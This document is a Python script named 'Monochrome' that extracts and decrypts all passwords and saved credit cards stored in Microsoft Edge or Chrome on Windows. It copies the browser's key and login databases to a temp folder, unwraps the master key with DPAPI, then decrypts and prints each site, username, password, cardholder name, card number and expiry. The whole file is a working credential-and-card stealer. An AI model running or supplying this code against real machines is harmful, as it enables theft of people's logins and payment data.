import json
import sys
import os
import win32crypt
import base64
import sqlite3

from Crypto.Cipher import AES


class Secret:
    signature = None
    nonce = None
    ciphertext = None
    tag = None

    def __init__(self, encrypted_password: bytes):
        self.signature = encrypted_password[0:2]
        self.nonce = encrypted_password[3:3 + 12]
        self.ciphertext = encrypted_password[3 + 12:-16]


class Credential:
    username = None
    password = None
    source = None

    def __init__(self, username: str, password: Secret, source: str):
        self.source = source
        self.username = username
        self.password = password


class CreditCard:
    guid = None
    holder_name = None
    expiration_month = None
    expiration_year = None
    number = None
    tag = None

    def __init__(self, holder: Secret, expiration_month: Secret, expiration_year: Secret, number: Secret, tag: Secret):
        self.holder_name = holder
        self.expiration_month = expiration_month
        self.expiration_year = expiration_year
        self.number = number
        self.tag = tag


# --- ENVIRONMENT SETTINGS --- #
# Change Microsoft\\Edge\\User Data to Google\\Chrome\\User Data for use with Chrome
userDataPath = os.path.join(os.environ['LOCALAPPDATA'], "Microsoft\\Edge\\User Data")
loginDataPath = os.path.join(userDataPath, "Default\\Login Data")
webDataPath = os.path.join(userDataPath, "Default\\Web Data")
masterKeyPath = os.path.join(userDataPath, "Local State")

# --- INITIAL SETUP --- #
# Create a temp folder for storing the login data files
tmpDirName = "Monochrome"
tmpDir = os.path.join(os.environ['TEMP'], tmpDirName)

print("MONOCHROME V0.1.1")
print("(c) Jakub Tetera 'InterCity' <jakub.tetera@gmail.com> \n")

if not os.path.exists(tmpDir):
    print("Creating temp directory at {tmpDir}")
    os.system(f"mkdir \"{tmpDir}\" > nul")


# --- MASTER KEY LOAD --- #
print("Loading master key...")
os.system(f"copy \"{masterKeyPath}\" \"{tmpDir}\\localstate.json\" > nul")
masterKey = None

with open(os.path.join(tmpDir, "localstate.json")) as key_file:
    key_json = json.load(key_file)
    masterKey = key_json["os_crypt"]["encrypted_key"]

masterKey = base64.b64decode(masterKey)
masterKey = masterKey[5:]  # remove the "DPAPI" prefix

decodedKey = None

try:
    # using wrapped CryptUnprotectData from dpapi.dll
    decodedKey = win32crypt.CryptUnprotectData(masterKey, None, None, None, 0)[1]  # returns tuple
    print("Master key loaded and decoded successfully.")
except Exception as e:
    print("Failed to decode master key.")
    print(e)
    exit(1)

# copy files for easier access
print(f"Opening login data file: {loginDataPath}")
os.system(f"copy \"{loginDataPath}\" \"{tmpDir}\\logindata.sqlite3\" > nul")

conn = None
cursor = None
credCount = 0

# --- CREDENTIAL DUMP --- #
try:
    print("Opening Login Data with sqlite3...")
    conn = sqlite3.connect(os.path.join(tmpDir, "logindata.sqlite3"))
    cursor = conn.cursor()
    print("Connection successful. \n")
except Exception as e:
    print(e)
    exit(2)

try:
    result = cursor.execute(
        "SELECT username_value, password_value, length(password_value), origin_url FROM logins").fetchall()
    for row in result:
        credential = Credential(row[0], Secret(row[1]), row[3])  # Username, encrypted password, source
        aes = AES.new(decodedKey, AES.MODE_GCM, nonce=credential.password.nonce)
        password_plaintext = aes.decrypt(credential.password.ciphertext)
        print(f"Site/Source: {credential.source}, Username: {credential.username}, Password: {password_plaintext}")
        credCount += 1

except Exception as e:
    print(e)
    exit(3)

print(f"---\nCredential dump complete, {credCount} entries found.")
cursor.close()
conn.close()

# --- Browsing Data Dump --- #
print(f"Opening browsing data file: {webDataPath}")
os.system(f"copy \"{webDataPath}\" \"{tmpDir}\\webdata.sqlite3\" > nul")

conn = None
try:
    conn = sqlite3.connect(os.path.join(tmpDir, "webdata.sqlite3"))
    cursor = conn.cursor()
except Exception as e:
    print(e)
print(f"Dumping credit cards...")
try:
    result = cursor.execute(
        "SELECT * FROM credit_cards JOIN credit_card_tags ON credit_cards.guid == credit_card_tags.guid")
    for row in result:
        # Result Schema
        # [0] GUID
        # [1] Cardholder Name (Encrypted)
        # [2] Expiration Month (Encrypted)
        # [3] Expiration Year (Encrypted)
        # [4] Card Number (Encrypted)
        # [5] Date Modified
        # [6] Origin
        # [7] Use Count
        # [8] Use Date
        # [9] Billing Address ID (Unclear what this is)
        # [10] Nickname
        # [11] GUID (From join)
        # [12] Tag
        # [13] Date/Time created
        card = CreditCard(Secret(row[1]), Secret(row[2]), Secret(row[3]), Secret(row[4]), Secret(row[12]))

        # It's unclear whether the same nonce is used in each case, so decryption needs to be done separately
        holder = AES.new(decodedKey, AES.MODE_GCM, card.holder_name.nonce).decrypt(card.holder_name.ciphertext)
        exp_month = AES.new(decodedKey, AES.MODE_GCM, card.expiration_month.nonce).decrypt(
            card.expiration_month.ciphertext)
        exp_year = AES.new(decodedKey, AES.MODE_GCM, card.expiration_year.nonce).decrypt(
            card.expiration_year.ciphertext)
        number = AES.new(decodedKey, AES.MODE_GCM, card.number.nonce).decrypt(card.number.ciphertext)
        tag = AES.new(decodedKey, AES.MODE_GCM, card.tag.nonce).decrypt(card.tag.ciphertext)

        print(
            f"Holder: {str(holder, 'UTF-8')}, Card Number: {str(number, 'UTF-8')}, Expiration: {str(exp_month, 'UTF-8')}/{str(exp_year, 'UTF-8')}, Tag: {str(tag, 'UTF-8')}")

except Exception as e:
    print(e)

print("\nBrowser data dump complete.")
